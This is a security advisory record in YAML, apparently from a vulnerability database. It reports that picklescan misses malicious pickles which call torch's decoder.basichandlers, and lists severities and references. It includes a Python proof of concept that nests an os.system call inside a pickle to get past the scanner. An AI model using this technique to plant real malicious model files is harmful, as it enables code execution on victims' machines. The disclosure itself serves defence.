vulnerability_id: VCID-cz27-4tev-4yas
aliases:
  - GHSA-h3qp-7fh3-f8h4
summary: |
  Picklescan missing detection when calling pytorch function torch.utils.data.datapipes.utils.decoder.basichandlers
  ### Summary

  Using torch.utils.data.datapipes.utils.decoder.basichandlers function, which is a pytorch library function to execute remote pickle file.

  ### Details

  The attack payload executes in the following steps:

  First, the attacker craft the payload by calling to torch.utils.data.datapipes.utils.decoder.basichandlers function in reduce method
  Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.

  ### PoC

  ```
  import torch.utils.data.datapipes.utils.decoder as decoder

  class EvilTorchUtilsDataDatapipesDecoder:
      def __reduce__(self):
          extension = 'pickle'
          class RCE:
              def __reduce__(self):
                  return os.system, ('whoami',)
          data = pickle.dumps(RCE())
          return decoder.basichandlers, (extension, data)
  ```

  ### Impact

  Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
  What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
  Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.

  ### Corresponding

  https://github.com/FredericDT
  https://github.com/Qhaoduoyu
severities:
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-h3qp-7fh3-f8h4
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/commit/7f994d62084fe43f1cffdef2f9bae6923344ef53
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/pull/47
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.28
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-h3qp-7fh3-f8h4
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-h3qp-7fh3-f8h4
weaknesses:
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/commit/7f994d62084fe43f1cffdef2f9bae6923344ef53
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/pull/47
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.28
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-h3qp-7fh3-f8h4
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-h3qp-7fh3-f8h4
    reference_type:
    reference_id: GHSA-h3qp-7fh3-f8h4
